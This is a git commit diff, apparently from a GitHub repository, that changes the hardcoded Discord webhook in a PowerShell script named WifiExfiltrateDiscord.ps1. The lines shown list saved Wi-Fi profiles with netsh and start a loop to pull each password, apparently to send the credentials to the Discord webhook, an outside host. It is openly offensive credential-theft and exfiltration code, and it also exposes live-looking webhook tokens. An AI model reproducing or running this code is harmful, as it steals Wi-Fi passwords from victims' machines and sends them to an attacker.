a4f46c82c2861c4e35c72d7cfc1f291b2b40d84a
almogelias <57565283+almogelias@users.noreply.github.com>
2024-06-25 00:01:36 +0300

    Update WifiExfiltrateDiscord.ps1

--- PowershellScripts/WifiExfiltrateDiscord.ps1
+++ PowershellScripts/WifiExfiltrateDiscord.ps1
@@ -1,5 +1,5 @@
 ﻿#Insert your webhook here
-$webhookUri = 'https://discord.com/api/webhooks/1254897191986794606/Dq5Qqfpouw0UQ3BlhNcyGFwqGZmLJ5yvN909bYXohiu_CkWNGoceWCSIJNwF9MNf83MT'
+$webhookUri = 'https://discord.com/api/webhooks/1254904170561933312/7GpZApBg0nimAUc2nfK91OErdZIlDZUIR8hSypvWXyaS8tnKiOvrFMi1P-2sYe_SoAu6'
 #Get List of SSIDS
 $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
 #A loop to get password for each SSID
